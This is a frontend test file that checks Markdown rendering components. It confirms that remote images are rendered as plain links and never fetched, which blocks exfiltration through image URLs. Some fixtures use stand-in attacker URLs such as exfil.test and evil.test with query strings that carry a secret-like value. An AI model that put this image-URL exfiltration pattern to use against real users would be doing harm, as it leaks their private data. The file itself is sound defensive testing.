import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import { InlineMarkdown, Markdown } from "./Markdown";

describe("Markdown", () => {
  it("renders GFM tables, links as plain anchors in a new tab, and fenced code as pre > code", () => {
    const { container } = render(<Markdown text={"| a | b |\n|---|---|\n| 1 | 2 |\n\n[docs](https://example.com)\n\n```py\nx = 1\n```"} />);
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("link", { name: "docs" })).toHaveAttribute("rel", "noopener noreferrer");
    expect(container.querySelector("pre > code")).toHaveTextContent("x = 1");
  });

  it("hands a fenced block's text and language to `code`, and leaves inline code alone", () => {
    const code = vi.fn((text: string, lang?: string) => <b data-lang={lang}>{text.toUpperCase()}</b>);
    const { container } = render(<Markdown text={"use `x` here\n\n```py\nx = 1\n```"} code={code} />);
    expect(code).toHaveBeenCalledWith("x = 1", "py");
    expect(container.querySelector("pre > code > b")).toHaveTextContent("X = 1");
    expect(container.querySelector("p > code")).toHaveTextContent("x");
  });

  it.each([
    ["absolute", "https://exfil.test:8849/pixel.png?secret=AKIA", "image: exfil.test:8849/pixel.png"],
    ["protocol-relative", "//exfil.test/p.gif?d=1", "image: exfil.test/p.gif"],
  ])("renders a remote image (%s) as a link to it, never fetched on its own", (_, src, label) => {
    const { container } = render(<Markdown text={`![status](${src})`} />);
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: label });
    expect(link).toHaveAttribute("href", src);
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    expect(link).toHaveAttribute("title", "status");
  });

  it.each([
    ["same-origin path", "/api/work-items/w1/diagram.png"],
    ["same-origin absolute", `${location.origin}/diagram.png`],
    ["inline data", "data:image/png;base64,iVBORw0KGgo="],
  ])("shows an image from %s", (_, src) => {
    const { container } = render(<Markdown text={`![chart](${src})`} />);
    expect(container.querySelector("img")).toHaveAttribute("src", src);
    expect(screen.queryByRole("link")).toBeNull();
  });

  it("keeps a remote image inside a link as text, so the outer link is the only anchor", () => {
    const { container } = render(<Markdown text={"[![build](https://evil.test/n.png?d=1)](https://ci.test/run)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a a")).toBeNull();
    const link = screen.getByRole("link");
    expect(link).toHaveAttribute("href", "https://ci.test/run");
    expect(link).toHaveTextContent("image: evil.test/n.png");
  });
});

describe("InlineMarkdown", () => {
  it.each([
    ["code and bold", "`commits` can be empty: **never** `max()`", "commits can be empty: never max()"],
    ["a link", "see [the docs](https://example.com/d)", "see the docs"],
    ["a heading as its text", "# Title", "Title"],
    ["no image, which would be fetched", "a ![x](https://exfil.test/p.png) b", "a  b"],
  ])("renders %s inline, with no markup left in the text", (_name, text, shown) => {
    const { container } = render(<InlineMarkdown text={text} />);
    expect(container.textContent!.trim()).toBe(shown);
    expect(container.querySelector("p, h1, ul, img, pre")).toBeNull();
  });

  it("makes code spans <code>, bold <strong> and links anchors that open in a new tab", () => {
    const { container } = render(<InlineMarkdown text={"`a` **b** [c](https://example.com)"} />);
    expect(container.querySelector("code")).toHaveTextContent("a");
    expect(container.querySelector("strong")).toHaveTextContent("b");
    expect(screen.getByRole("link", { name: "c" })).toHaveAttribute("target", "_blank");
  });
});
